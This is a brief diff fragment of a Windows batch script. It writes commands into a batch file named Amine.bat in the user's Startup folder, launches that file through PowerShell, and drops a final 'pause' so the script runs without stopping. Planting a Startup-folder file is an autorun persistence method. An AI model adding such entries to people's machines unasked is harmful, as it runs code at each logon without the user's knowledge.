@@ -43,4 +43,4 @@ echo start explorer.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup
 echo exit >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Amine.bat"
 
 powershell -Command "& { Invoke-Item \"$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\Amine.bat\" }"
-pause
+
